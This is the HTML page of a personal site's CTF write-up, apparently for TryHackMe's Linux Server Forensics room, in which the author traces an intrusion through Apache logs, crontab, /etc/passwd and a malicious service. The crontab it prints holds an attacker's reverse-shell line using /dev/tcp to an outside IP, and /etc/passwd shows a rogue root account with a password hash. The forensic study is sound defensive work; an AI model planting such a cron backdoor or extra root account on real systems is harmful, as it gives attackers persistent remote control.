@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GamingServer — Write-Up</title>
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="stylesheet" href="../styles.css">
+    <script src="../script.js" defer></script>
+</head>
+
+<body>
+
+<div id="mobile-menu-button">
+    &#9776;
+</div>
+
+<div id="sidebar" class="sidebar">
+    <h2>~/home</h2>
+    <a href="../index.html">Home</a>
+    <a href="../about.html">About Me</a>
+    <a href="../projects.html">Projects</a>
+    <a href="../writeups.html" class="active">Write-Ups</a>
+    <a href="../contact.html">Contact</a>
+
+    <div class="social-icons">
+        <a href="https://www.linkedin.com/in/iustin-barbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/linkedin.svg" alt="LinkedIn">
+        </a>
+        <a href="https://github.com/IustinBarbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/github.svg" alt="GitHub">
+        </a>
+        <a href="https://tryhackme.com/p/Glitch21" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/tryhackme.svg" alt="TryHackMe">
+        </a>
+    </div>
+</div>
+
+<section id="writeup-container">
+    <div class="writeup-content">
+        <h1>Linux Server Forensics</h1>
+
+        <p>First ssh into the machine using the given credentials</p>
+
+        <p>How many different tools made requests to the server?</p>
+        <p>access.log is a pretty big file, but it is easy to notice the first tool - dirbuster. For the rest, I tried using grep to look for tools</p>
+
+        <pre><code>grep "nmap" access.log</code></pre>
+
+        <p>This would also answer the next question:</p>
+        <p>Name a path requested by Nmap</p>
+
+        <p>I simply looked at the all the results that contained Nmap, since there were not so many of them. However, a more elegant solution would have been</p>
+
+        <pre><code>cat access.log | grep nmap | cut -d ‘“‘ -f 2 | sort | uniq</code></pre>
+
+        <p>Next I had to look at the actual website.</p>
+        <p>As the question suggests, contact.php allows users to upload files to the server</p>
+
+        <p>What IP uploaded files to the server?</p>
+        <p>I first tried using grep for "contact.php", but there were still a couple of resutls, most of them being GET requests</p>
+        <p>So, a better solution was to grep for "POST" directly</p>
+
+        <pre><code>fred@acmeweb:/var/log/apache2$ grep "POST" access.log
+192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "POST / HTTP/1.1" 200 2495 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+192.168.56.24 - - [20/Apr/2021:09:53:46 +0000] "POST /sdk HTTP/1.1" 404 454 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
+Binary file access.log matches</code></pre>
+
+        <p>Who left an exposed security notice on the server?</p>
+        <p>This was a bit harded. I used the hint and found out that I need to see what dirbuster found. This command led me to the /resources folder on the website</p>
+
+        <pre><code>grep -i "dirbuster" access.log</code></pre>
+
+        <p>a better option would have been:</p>
+
+        <pre><code>grep -i "dirbuster" access.log | grep "GET" | grep "200" | less</code></pre>
+
+        <p>Then, I looked in every folder untill I found</p>
+        <p>SECURITY.md in /resources/development/2021/docs/</p>
+
+        <pre><code>we have to really got to sort out the contact page theres **NO** validation whatsoever.I can't belive we haven't been hacked yet - Fred.</code></pre>
+
+        <p>What command and option did the attacker use to establish a backdoor?</p>
+        <p>Since THM already gives a hint as to what tool was used (Cron), I could try to cat out the whole directory</p>
+
+        <pre><code>fred@acmeweb:/var/log$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+*  *    * * *   root2   sh -i >& /dev/tcp/192.168.56.206/1234 0>&1
+fred@acmeweb:/var/log$</code></pre>
+
+        <p>What is the password of the second root account?</p>
+        <p>fred's acc does not have permissions to access /etc/shadow</p>
+        <p>However, on futher inspection, fred could use sudo in order to access the file</p>
+
+        <pre><code>fred@acmeweb:/var/log$ sudo -l
+Matching Defaults entries for fred on acmeweb:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User fred may run the following commands on acmeweb:
+    (ALL : ALL) ALL
+fred@acmeweb:/var/log$</code></pre>
+
+        <p>This was not needed at all, since root2 is not even in /etc/shadow, but it is in /etc/passwd</p>
+
+        <pre><code>fred@acmeweb:/var/log$ grep "root2" /etc/passwd
+fred@acmeweb:/var/log$ sudo grep "root2" /etc/shadow
+fred@acmeweb:/var/log$ grep "root2" /etc/passwd
+root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash</code></pre>
+
+        <p>I googled the hash (the hint suggests it is used in forums) and got the passwd</p>
+
+        <p>Second VM now:</p>
+
+        <p>Name one of the non-standard HTTP Requests.</p>
+        <p>access.log has mostly GET requests, so i wanted to grep everything except for GET</p>
+
+        <pre><code>fred@acmeweb:/var/log/apache2$ grep -av "GET" access.log 
+192.168.56.206 - - [20/Apr/2021:13:30:15 +0000] "\x16\x03" 400 0 "-" "-"
+192.168.56.206 - - [20/Apr/2021:13:30:15 +0000] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML"
+192.168.56.206 - - [20/Apr/2021:13:30:15 +0000] "GXWR / HTTP/1.1" 501 498 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML"
+192.168.56.110 - - [20/Apr/2021:13:32:46 +0000] "POST /contact.php HTTP/1.1" 200 1018 "http://192.168.56.9/contact.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"</code></pre>
+
+        <p>ideally, i should have also removed POST requests, since they are also pretty common, but I could not make the command work for get and post at the same time :D</p>
+
+        <p>At what time was the Nmap scan performed? (format: HH:MM:SS)</p>
+        <p>I am assumming the above weird request was performed by nmap</p>
+
+        <p>What username and hostname combination can be found in one of the authorized_keys files? (format: username@hostname)</p>
+        <p>In order to cat these out, we need a root shell. Luckily the machine allows it</p>
+
+        <pre><code>fred@acmeweb:/var/log/apache2$ sudo -i
+[sudo] password for fred: 
+root@acmeweb:~#</code></pre>
+
+        <p>then</p>
+
+        <pre><code>root@acmeweb:~# cat /root/.ssh/authorized_keys</code></pre>
+
+        <p>What is the first command present in root’s bash_history file?</p>
+
+        <pre><code>root@acmeweb:~# cat .bash_history 
+nano /etc/passwd
+exit
+root@acmeweb:~#</code></pre>
+
+        <p>This also worked because there were very few commands, but a more flexible approach should have been</p>
+
+        <pre><code>root@acmeweb:~# head -1 .bash_history 
+nano /etc/passwd</code></pre>
+
+        <p>The last VM</p>
+
+        <p>This was interesting as it started moving on its own due to some malware</p>
+
+        <p>as suggested by THM, i ran the systemctl command using the type and state flags</p>
+
+        <pre><code>systemctl --type=service --state=active</code></pre>
+
+        <p>nothing here seems off unfortunately, so i just took them all individually, but nothing caught my eye. I had to google to find which one was the malicous service</p>
+
+        <p>Looking back at it, I should have noticed there is a script here, considering the file is .sh.</p>
+
+        <pre><code>fred@acmeweb:~$ systemctl status IpManager.service
+                                                                               
+INFO!:  PURGING RAM BITS
+                                                                               
+● IpManager.service
+   Loaded: loaded (/var/lib/network/IpManager.service; enabled; vendor preset: enabled)
+   Active: active (running) since Sat 2026-02-14 17:51:22 UTC; 6min ago
+ Main PID: 1501 (bash)
+    Tasks: 2 (limit: 477)
+   CGroup: /system.slice/IpManager.service
+           ├─1501 /bin/bash /etc/network/ZGtsam5hZG1ua2Fu.sh
+           └─1885 sleep 10
+
+Feb 14 17:57:06 acmeweb bash[1501]: tput: No value for $TERM and no -T specified
+Feb 14 17:57:06 acmeweb bash[1501]: tput: No value for $TERM and no -T specified
+Feb 14 17:57:16 acmeweb bash[1501]: tput: No value for $TERM and no -T specified
+Feb 14 17:57:16 acmeweb bash[1501]: tput: No value for $TERM and no -T specified
+Feb 14 17:57:26 acmeweb bash[1501]: tput: No value for $TERM and no -T specified
+Feb 14 17:57:26 acmeweb bash[1501]: tput: No value for $TERM and no -T specified
+Feb 14 17:57:36 acmeweb bash[1501]: tput: No value for $TERM and no -T specified
+Feb 14 17:57:36 acmeweb bash[1501]: tput: No value for $TERM and no -T specified
+Feb 14 17:57:46 acmeweb bash[1501]: tput: No value for $TERM and no -T specified
+Feb 14 17:57:46 acmeweb bash[1501]: tput: No value for $TERM and no -T specified
+Feb 14 17:57:56 acmeweb bash[1501]: tput: No value for $TERM and no -T specified
+Feb 14 17:57:56 acmeweb bash[1501]: tput: No value for $TERM and no -T specified
+fred@acmeweb:~$</code></pre>
+
+        <p>After this, stop the server and go the script to find the flag</p>
+
+        <p>It helped opening the file with nano instead of just using cat, as it is too long and hard to read</p>
+
+    </div>
+</section>
+
+</body>
+</html>
